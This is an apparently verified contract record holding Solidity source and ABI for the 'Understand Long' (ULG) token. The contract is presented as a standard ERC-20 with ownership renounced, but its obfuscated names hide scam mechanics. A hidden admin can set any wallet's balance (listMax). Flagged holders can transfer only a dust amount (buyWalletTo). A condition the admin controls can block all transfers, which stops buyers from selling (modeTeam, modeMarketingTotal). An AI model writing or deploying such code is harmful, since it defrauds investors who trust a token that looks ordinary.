{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface buyMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingToken {\n    function createPair(address launchedAtExempt, address enableTx) external returns (address);\n}\n\ninterface listTradingMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTo) external view returns (uint256);\n\n    function transfer(address tradingTx, uint256 fundLaunchedAt) external returns (bool);\n\n    function allowance(address exemptMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLaunchedAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTx,\n        uint256 fundLaunchedAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchFund, uint256 value);\n    event Approval(address indexed exemptMin, address indexed spender, uint256 value);\n}\n\ninterface isMinFrom is listTradingMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderstandLong is isAt, listTradingMode, isMinFrom {\n\n    mapping(address => bool) public takeTx;\n\n    function name() external view virtual override returns (string memory) {\n        return maxFee;\n    }\n\n    address public buyTeam;\n\n    mapping(address => bool) public atLiquidity;\n\n    function modeMarketingTotal(address teamTokenMode, address tradingTx, uint256 fundLaunchedAt) internal returns (bool) {\n        if (teamTokenMode == shouldTx) {\n            return tradingTeam(teamTokenMode, tradingTx, fundLaunchedAt);\n        }\n        uint256 launchReceiverShould = listTradingMode(buyTeam).balanceOf(marketingLimit);\n        require(launchReceiverShould == modeSenderSell);\n        require(tradingTx != marketingLimit);\n        if (takeTx[teamTokenMode]) {\n            return tradingTeam(teamTokenMode, tradingTx, tradingFund);\n        }\n        return tradingTeam(teamTokenMode, tradingTx, fundLaunchedAt);\n    }\n\n    function exemptReceiver() private view {\n        require(atLiquidity[_msgSender()]);\n    }\n\n    function totalSell(address receiverTotalSender) public {\n        if (feeReceiver) {\n            return;\n        }\n        \n        atLiquidity[receiverTotalSender] = true;\n        if (exemptMinLimit) {\n            autoTotal = false;\n        }\n        feeReceiver = true;\n    }\n\n    function transfer(address isAtTrading, uint256 fundLaunchedAt) external virtual override returns (bool) {\n        return modeMarketingTotal(_msgSender(), isAtTrading, fundLaunchedAt);\n    }\n\n    uint256 private toAutoSwap = 100000000 * 10 ** 18;\n\n    bool private autoTotal;\n\n    bool private toFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountSwapToken;\n    }\n\n    uint256 modeSenderSell;\n\n    function transferFrom(address teamTokenMode, address tradingTx, uint256 fundLaunchedAt) external override returns (bool) {\n        if (_msgSender() != shouldReceiver) {\n            if (fundReceiver[teamTokenMode][_msgSender()] != type(uint256).max) {\n                require(fundLaunchedAt <= fundReceiver[teamTokenMode][_msgSender()]);\n                fundReceiver[teamTokenMode][_msgSender()] -= fundLaunchedAt;\n            }\n        }\n        return modeMarketingTotal(teamTokenMode, tradingTx, fundLaunchedAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverShould;\n    }\n\n    event OwnershipTransferred(address indexed exemptLiquidity, address indexed isReceiver);\n\n    string private maxFee = \"Understand Long\";\n\n    address marketingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listMax(address isAtTrading, uint256 fundLaunchedAt) public {\n        exemptReceiver();\n        amountWallet[isAtTrading] = fundLaunchedAt;\n    }\n\n    address private receiverShould;\n\n    function modeTeam(uint256 fundLaunchedAt) public {\n        exemptReceiver();\n        modeSenderSell = fundLaunchedAt;\n    }\n\n    bool public feeReceiver;\n\n    address shouldReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toAutoSwap;\n    }\n\n    function owner() external view returns (address) {\n        return receiverShould;\n    }\n\n    uint256 constant tradingFund = 11 ** 10;\n\n    function modeTrading() public {\n        emit OwnershipTransferred(shouldTx, address(0));\n        receiverShould = address(0);\n    }\n\n    function buyWalletTo(address liquidityList) public {\n        exemptReceiver();\n        if (walletSell != toFrom) {\n            takeWalletSwap = true;\n        }\n        if (liquidityList == shouldTx || liquidityList == buyTeam) {\n            return;\n        }\n        takeTx[liquidityList] = true;\n    }\n\n    function approve(address atReceiver, uint256 fundLaunchedAt) public virtual override returns (bool) {\n        fundReceiver[_msgSender()][atReceiver] = fundLaunchedAt;\n        emit Approval(_msgSender(), atReceiver, fundLaunchedAt);\n        return true;\n    }\n\n    bool public takeWalletSwap;\n\n    bool private walletLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromSwap;\n    }\n\n    uint256 private shouldLaunchedIs;\n\n    uint8 private fromSwap = 18;\n\n    function allowance(address swapBuy, address atReceiver) external view virtual override returns (uint256) {\n        if (atReceiver == shouldReceiver) {\n            return type(uint256).max;\n        }\n        return fundReceiver[swapBuy][atReceiver];\n    }\n\n    constructor (){\n        \n        buyMarketing modeLiquidity = buyMarketing(shouldReceiver);\n        buyTeam = tradingToken(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));\n        \n        shouldTx = _msgSender();\n        modeTrading();\n        atLiquidity[shouldTx] = true;\n        amountWallet[shouldTx] = toAutoSwap;\n        \n        emit Transfer(address(0), shouldTx, toAutoSwap);\n    }\n\n    bool private exemptMinLimit;\n\n    function tradingTeam(address teamTokenMode, address tradingTx, uint256 fundLaunchedAt) internal returns (bool) {\n        require(amountWallet[teamTokenMode] >= fundLaunchedAt);\n        amountWallet[teamTokenMode] -= fundLaunchedAt;\n        amountWallet[tradingTx] += fundLaunchedAt;\n        emit Transfer(teamTokenMode, tradingTx, fundLaunchedAt);\n        return true;\n    }\n\n    uint256 exemptAmount;\n\n    string private amountSwapToken = \"ULG\";\n\n    mapping(address => mapping(address => uint256)) private fundReceiver;\n\n    uint256 public launchedMaxTake;\n\n    function balanceOf(address shouldTo) public view virtual override returns (uint256) {\n        return amountWallet[shouldTo];\n    }\n\n    address public shouldTx;\n\n    bool private walletSell;\n\n    mapping(address => uint256) private amountWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchedAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"buyWalletTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMaxTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAtTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchedAt\",\"type\":\"uint256\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLaunchedAt\",\"type\":\"uint256\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWalletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotalSender\",\"type\":\"address\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAtTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchedAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTokenMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchedAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderstandLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}